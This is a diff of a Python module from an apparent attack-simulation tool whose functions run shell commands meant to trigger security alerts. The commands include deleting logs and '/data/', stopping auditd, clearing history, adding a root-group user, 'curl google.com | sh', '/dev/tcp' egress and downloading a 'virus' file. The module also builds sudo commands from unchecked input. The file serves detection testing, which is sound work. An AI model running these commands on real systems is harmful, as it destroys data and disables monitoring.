@@ -1,132 +1,156 @@
 #!/usr/bin/python3
-from Agent.AaSystem.Log import PrintAndLog, PrintRedAndLog
-from Agent.AaSystem.SystemInspector import GetOperatingSystemName
-from Agent.AttackAgent.Bash.BashCommandExecutor import RunSubProcess
 import os
+from AaSystem.LogAndPrint.Log import PrintAndLog, PrintRedAndLog
+from AaSystem.OperatingSystem.SystemInspector import GetOperatingSystemName
+from Agent.AttackAgent.BashCommands.BashCommandExecutor import RunSubProcess
 
 
-class BashCommands:
-    def IpConfig(self, request):
-        if str.lower(GetOperatingSystemName()) == "linux":
-            return RunSubProcess("ifconfig -a")
-        return RunSubProcess("ipconfig")
+def IpConfig(request):
+    if str.lower(GetOperatingSystemName()) == "linux":
+        return RunSubProcess("ifconfig -a")
+    return RunSubProcess("ipconfig")
 
-    def AddSuspiciousUser(self, request):
-        return RunSubProcess("sudo useradd aaa -g 0")
 
-    def SuspiciousNohup(self, request):
-        return RunSubProcess("nohup cat /tmp/")
+def AddSuspiciousUser(request):
+    return RunSubProcess("sudo useradd aaa -g 0")
 
-    def ReverseShell(self, request):
-        return RunSubProcess("python import socket /bin/sh")
 
-    def RemovelOfSystemLogs(self, request):
-        return RunSubProcess("rm /var/log/lastlog")
+def SuspiciousNohup(request):
+    return RunSubProcess("nohup cat /tmp/")
 
-    def Ransomware(self, request):
-        return RunSubProcess("touch test.GNNCRY")
 
-    def PrivilegedContainer(self, request):
-        return RunSubProcess("docker run redis --privileged")
+def ReverseShell(request):
+    return RunSubProcess("python import socket /bin/sh")
 
-    def PossibleMalware(self, request):
-        return RunSubProcess(" curl pastebin.com")
 
-    def OverrideLinuxFiles(self, request):
-        return RunSubProcess("cp /bin/netstat a")
+def RemovelOfSystemLogs(request):
+    return RunSubProcess("rm /var/log/lastlog")
 
-    def LinuxReconnaissance(self, request):
-        return RunSubProcess("uname -n -s -r -v")
 
-    def LinuxBackdoor(self, request):
-        return RunSubProcess("touch d-bus notifier")
+def Ransomware(request):
+    return RunSubProcess("touch test.GNNCRY")
 
-    def FairwareMalware(self, request):
-        return RunSubProcess("rm -rf /data/")
 
-    def EgressData(self, request):
-        return RunSubProcess("bash /dev/tcp/")
+def PrivilegedContainer(request):
+    return RunSubProcess("docker run redis --privileged")
 
-    def DownloadFileThenRun(self, request):
-        return RunSubProcess("curl google.com | sh")
 
-    def DisableFirewall(self, request):
-        return RunSubProcess("touch f0VMRgIBAQ")
+def PossibleMalware(request):
+    return RunSubProcess(" curl pastebin.com")
 
-    def DisableAuditdLogging(self, request):
-        return RunSubProcess("sudo service auditd stop")
 
-    def CryptoMiner(self, request):
-        return RunSubProcess("git clone https://github.com/cpuminer")
+def OverrideLinuxFiles(request):
+    return RunSubProcess("cp /bin/netstat a")
 
-    def CommonBots(self, request):
-        return RunSubProcess("touch RTEGFN01.dat")
 
-    def ClearHistoryFile(self, request):
-        return RunSubProcess("history -c")
+def LinuxReconnaissance(request):
+    return RunSubProcess("uname -n -s -r -v")
 
-    def DownloadVirusFile(self, request):
-        return RunSubProcess("sudo mkdir -p ~/AriotsTemp/virus;sudo wget -O ~/AriotsTemp/virus/virus.txt "
-                             "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt")
 
-    def DownloadFile(self, request):
-        if not request:
-            PrintRedAndLog("Missing required parameter: download url")
-        url = request[0]
-        return RunSubProcess(f"sudo mkdir -p ~/AriotsTemp;sudo wget -O ~/AriotsTemp/{os.path.basename(url)} {url}")
+def LinuxBackdoor(request):
+    return RunSubProcess("touch d-bus notifier")
 
-    def WhoAmI(self, request):
-        if request and request[0] == "-r":
-            return RunSubProcess("sudo whoami")
-        return RunSubProcess("whoami")
 
-    def Ping(self, request):
-        if not request:
-            PrintRedAndLog("Missing required parameters")
-        requestPing = request[0]
-        if requestPing == "google":
-            return RunSubProcess("ping -c 4 google.com")
-        if requestPing == "self":
-            return RunSubProcess("ping -c 4 127.0.0.1")
-        if requestPing == "8":
-            return RunSubProcess("ping -c 4 8.8.8.8")
-        if requestPing == "-c" and len(request) > 1:
-            return RunSubProcess(f"ping -c 4 {request[1]}")
-        PrintRedAndLog("Invalid or missing parameters")
+def FairwareMalware(request):
+    return RunSubProcess("rm -rf /data/")
 
-    def AddUser(self, request):
-        if not request or len(request) < 2:
-            PrintRedAndLog("Missing required parameters")
-            return
-        userType = request[0]
-        if userType == "-r":
-            return RunSubProcess(f"useradd {request[0]}")
-        if userType == "-a":
-            return RunSubProcess(f"useradd {request[0]} sudo")
-        PrintRedAndLog("Invalid parameter passed")
+
+def EgressData(request):
+    return RunSubProcess("bash /dev/tcp/")
+
+
+def DownloadFileThenRun(request):
+    return RunSubProcess("curl google.com | sh")
+
+
+def DisableFirewall(request):
+    return RunSubProcess("touch f0VMRgIBAQ")
+
+
+def DisableAuditdLogging(request):
+    return RunSubProcess("sudo service auditd stop")
+
+
+def CryptoMiner(request):
+    return RunSubProcess("git clone https://github.com/cpuminer")
+
+
+def CommonBots(request):
+    return RunSubProcess("touch RTEGFN01.dat")
+
+
+def ClearHistoryFile(request):
+    return RunSubProcess("history -c")
+
+
+def DownloadVirusFile(request):
+    return RunSubProcess("sudo mkdir -p ~/AriotsTemp/virus;sudo wget -O ~/AriotsTemp/virus/virus.txt "
+                         "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt")
+
+
+def DownloadFile(request):
+    if not request:
+        PrintRedAndLog("Missing required parameter: download url")
+    url = request[0]
+    return RunSubProcess(f"sudo mkdir -p ~/AriotsTemp;sudo wget -O ~/AriotsTemp/{os.path.basename(url)} {url}")
+
+
+def WhoAmI(request):
+    if request and request[0] == "-r":
+        return RunSubProcess("sudo whoami")
+    return RunSubProcess("whoami")
+
+
+def Ping(request):
+    if not request:
+        PrintRedAndLog("Missing required parameters")
+    requestPing = request[0]
+    if requestPing == "google":
+        return RunSubProcess("ping -c 4 google.com")
+    if requestPing == "self":
+        return RunSubProcess("ping -c 4 127.0.0.1")
+    if requestPing == "8":
+        return RunSubProcess("ping -c 4 8.8.8.8")
+    if requestPing == "-c" and len(request) > 1:
+        return RunSubProcess(f"ping -c 4 {request[1]}")
+    PrintRedAndLog("Invalid or missing parameters")
+
+
+def AddUser(request):
+    if not request or len(request) < 2:
+        PrintRedAndLog("Missing required parameters")
         return
+    userType = request[0]
+    if userType == "-r":
+        return RunSubProcess(f"useradd {request[0]}")
+    if userType == "-a":
+        return RunSubProcess(f"useradd {request[0]} sudo")
+    PrintRedAndLog("Invalid parameter passed")
+    return
 
-    def ChangeUserPassword(self, request):
-        if not request or len(request) < 2:
-            PrintRedAndLog("Missing required parameters")
-        newPassword = request[0]
-        user = request[1]
-        return RunSubProcess(f"sudo {newPassword} {user}")
 
-    def KillProcess(self, request):
-        if not request or len(request) < 2:
-            PrintRedAndLog("Missing required parameters")
-        killType = request[0]
-        killName = request[1]
-        if killType == "-p":
-            return RunSubProcess(f"sudo kill -9 $(lsof -t -i:{killName})")
-        if killType == "-n":
-            return RunSubProcess(f"sudo killall -9 {killName}")
-        if killType == "-s":
-            return RunSubProcess(f"sudo pkill -9 {killName}")
-        if killType == "-i":
-            return RunSubProcess(f"sudo kill -9 {killName}")
-        return PrintRedAndLog(f"Invalid parameter killType: {killType} passed")
+def ChangeUserPassword(request):
+    if not request or len(request) < 2:
+        PrintRedAndLog("Missing required parameters")
+    newPassword = request[0]
+    user = request[1]
+    return RunSubProcess(f"sudo {newPassword} {user}")
+
+
+def KillProcess(request):
+    if not request or len(request) < 2:
+        PrintRedAndLog("Missing required parameters")
+    killType = request[0]
+    killName = request[1]
+    if killType == "-p":
+        return RunSubProcess(f"sudo kill -9 $(lsof -t -i:{killName})")
+    if killType == "-n":
+        return RunSubProcess(f"sudo killall -9 {killName}")
+    if killType == "-s":
+        return RunSubProcess(f"sudo pkill -9 {killName}")
+    if killType == "-i":
+        return RunSubProcess(f"sudo kill -9 {killName}")
+    return PrintRedAndLog(f"Invalid parameter killType: {killType} passed")
 
 
 class BashCommandsHelp:
@@ -295,14 +319,14 @@ def GetBashCommandsSwitch(helpRequested=False):
 
 def HelpRequested(availableCommands):
     text = "Command parameters: ba [BashCommand]\n" \
-           "ba: stands for Bash Attack. ba commands run bash code aimed at triggering alerts supporting "\
-           "larger attack functions\n"\
+           "ba: stands for Bash Attack. ba commands run bash code aimed at triggering alerts supporting " \
+           "larger attack functions\n" \
            "     'BashCommand' - The type of Bash Command that will be run\n" \
            "     Possible BashCommands:\n"
     for command in availableCommands:
         text = f"{text}            {command}\n"
-    text = f"{text}It is also possible to pass your own bash code by passing the argument -c and then the code "\
-           "in parentheses, i.e.: attackagent ba -c 'ipconfig'\n"\
+    text = f"{text}It is also possible to pass your own bash code by passing the argument -c and then the code " \
+           "in parentheses, i.e.: attackagent ba -c 'ipconfig'\n" \
            "For more information on a command add -help after a command, i.e.: 'ba getip -help'"
     PrintAndLog(text)
 
@@ -330,3 +354,6 @@ def RunBashCommand(request):
         return
     bashCommandHelpRequested = "-help" in request
     GetBashCommandsSwitch(bashCommandHelpRequested)[command](request[1:])
+
+
+IpConfig.PublicFacing = "getip"
